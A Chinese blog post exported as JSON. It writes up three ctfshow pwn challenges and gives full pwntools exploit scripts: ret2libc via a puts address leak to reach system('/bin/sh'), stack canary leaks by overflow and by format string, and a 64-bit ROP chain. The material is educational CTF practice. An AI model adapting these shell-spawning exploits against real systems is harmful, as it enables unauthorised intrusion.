{"title":"ctfshow-pwn","uid":"52662f34cef48ec0871eed4c3bef0137","slug":"ctfshow-pwn","date":"2021-10-16T09:55:50.000Z","updated":"2021-10-17T02:23:57.761Z","comments":true,"path":"api/articles/ctfshow-pwn.json","keywords":null,"cover":[],"content":"<h1 id=\"pwn03\"><a href=\"#pwn03\" class=\"headerlink\" title=\"pwn03\"></a>pwn03</h1><p>将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用<img src=\"https://i.loli.net/2021/10/16/SdbDYyzAl3TumcV.png\" alt=\"image.png\"></p>\n<p>所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤：</p>\n<ul>\n<li>泄露 puts地址</li>\n<li>获取 libc 版本</li>\n<li>获取 system 地址与 /bin/sh 的地址</li>\n<li>再次执行源程序</li>\n<li>触发栈溢出执行 system(‘/bin/sh’)</li>\n</ul>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./stack1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28015</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./stack1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]       <span class=\"comment\"># 获取puts的plt</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]           <span class=\"comment\"># 获取puts的got</span></span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]          <span class=\"comment\"># 获取程序开始地址</span></span><br><span class=\"line\">payload1 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,puts_plt,start_addr,puts_got])         <span class=\"comment\"># 泄露puts的got地址</span></span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n\\n&#x27;</span>)         <span class=\"comment\"># 这里耽误了好久，因为要读取掉两个换行符，不然后面获取地址就会出错</span></span><br><span class=\"line\">libc_puts_addr = u32(p.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])          <span class=\"comment\"># 接收泄露的地址</span></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)        <span class=\"comment\"># 找到对应的libc</span></span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)         <span class=\"comment\"># 计算基地址</span></span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)         <span class=\"comment\"># 算出system函数的地址</span></span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">13</span>,sys_addr,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>,bin_sh])</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn04\"><a href=\"#pwn04\" class=\"headerlink\" title=\"pwn04\"></a>pwn04</h1><p>用ida打开发现存在明显的栈溢出并且还存在后门函数<img src=\"https://i.loli.net/2021/10/16/YkhGbwR5uyam1Np.png\" alt=\"屏幕截图 2021-10-16 181459.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/16/odXSjLRgc1mpGra.png\" alt=\"屏幕截图 2021-10-16 181732.png\"></p>\n<p>checksec查看发现存在canary保护，所以思路就是绕过canary保护进入后门函数从而获取shell</p>\n<p>通过IDA查看可以发现canary在ebp-c的位置，所以我们可以利用第一轮输入来泄露canary</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>因为存在回显所以要将回显接收不然canary就会出错，已经踩坑</strong></p>\n<p><img src=\"https://i.loli.net/2021/10/16/Wof2tuehQjwRYgx.png\" alt=\"屏幕截图 2021-10-16 182347.png\"></p>\n<p>获取了canary接下来就是绕过canary进入后门函数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br></pre></td></tr></table></figure>\n\n<p><strong>因为canary是四个字节，而到返回地址还需要0x70-0x64-4=8个字节，所以需要补充8个字节</strong></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><p>exp1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28132</span>)</span><br><span class=\"line\"><span class=\"comment\"># p = process(&#x27;./ex2&#x27;)</span></span><br><span class=\"line\">get_shell = <span class=\"number\">0x80485AF</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Hello Hacker!\\n&#x27;</span>,payload1)</span><br><span class=\"line\">a = p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">payload2 = flat([<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x64</span>,canary,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>,get_shell])</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>exp2：</p>\n<p>也是通过printf泄露，不过是通过计算canary到printf的偏移来泄露</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./ex&quot;)</span></span><br><span class=\"line\">p =remote(<span class=\"string\">&quot;111.231.70.44&quot;</span>,<span class=\"number\">28097</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">leak_canary = <span class=\"string\">&quot;%31$x&quot;</span></span><br><span class=\"line\">p.sendline(leak_canary)</span><br><span class=\"line\">canary = <span class=\"built_in\">int</span>(p.recv(),<span class=\"number\">16</span>)</span><br><span class=\"line\">print(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\">getshell = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">100</span> + p32(canary) + <span class=\"string\">b&quot;b&quot;</span> * <span class=\"number\">12</span> + p32(<span class=\"number\">0x0804859B</span>)</span><br><span class=\"line\">p.sendline(getshell)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn07\"><a href=\"#pwn07\" class=\"headerlink\" title=\"pwn07\"></a>pwn07</h1><p>打开发现是64位程序，分析一下发现pwn03做法相同，泄露函数地址从而获取libc版本找到system函数进而获取shell。在某些细节上还是有点不同，32位是通过栈传递参数，而64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：</p>\n<p>泄露puts函数需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)目的用于堆栈对齐，不然后面会报错。</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28138</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x04006e3</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x0004006E4</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pwn1&#x27;</span>)</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">start_addr = elf.symbols[<span class=\"string\">&#x27;_start&#x27;</span>]</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\x0a&#x27;</span>)</span><br><span class=\"line\">libc_puts_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>, libc_puts_addr)</span><br><span class=\"line\">libcbase = libc_puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = libcbase+libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">20</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","feature":true,"text":"pwn03将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用 所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤： 泄露 puts地址 获取 libc 版本 获取 system 地址与 /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn03\"><span class=\"toc-text\">pwn03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#exp\"><span class=\"toc-text\">exp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn04\"><span class=\"toc-text\">pwn04</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn07\"><span class=\"toc-text\">pwn07</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"延迟绑定","uid":"a4072082096b626cb339c7cf12b546b7","slug":"plt、got和延迟绑定","date":"2021-10-17T02:26:57.000Z","updated":"2021-10-21T11:34:25.880Z","comments":true,"path":"api/articles/plt、got和延迟绑定.json","keywords":null,"cover":[],"text":"程序运行时，printf的地址就会被存储到data段，call c &lt;hello+0xc&gt;就会跳转到call printf_stub 123printf_stub: mov rax,[printf函数地址] jmp rax 程序在编译的时候会采用两种表进行辅助，即pl...","link":"","photos":[],"count_time":{"symbolsCount":"1.3k","symbolsTime":"1 mins."},"categories":[{"name":"心得","slug":"心得","count":3,"path":"api/categories/心得.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"QQ闪照破解（待完结）","uid":"cca552dbfefca5d5c398c58d9b5bb49c","slug":"QQ闪照","date":"2021-10-13T11:02:46.000Z","updated":"2021-10-13T12:12:39.912Z","comments":true,"path":"api/articles/QQ闪照.json","keywords":null,"cover":"https://i.loli.net/2021/10/13/SQzI7OaUjl2bJ83.jpg","text":" 和朋友聊天时突发奇想，想尝试一下获取闪照源文件，忙了一个下午还是没有解决（主要是太菜了 /(ㄒoㄒ)/~~ ） 原理和思路闪照貌似是一种木马改编而来，但是因为实用性不高可能就被设计成闪照了（盲猜）。闪照的工作原理大概是有一个FLAG_SECURE窗口，如果启用了FLAG_SEC...","link":"","photos":[],"count_time":{"symbolsCount":"8.6k","symbolsTime":"8 mins."},"categories":[],"tags":[{"name":"感想","slug":"感想","count":2,"path":"api/tags/感想.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}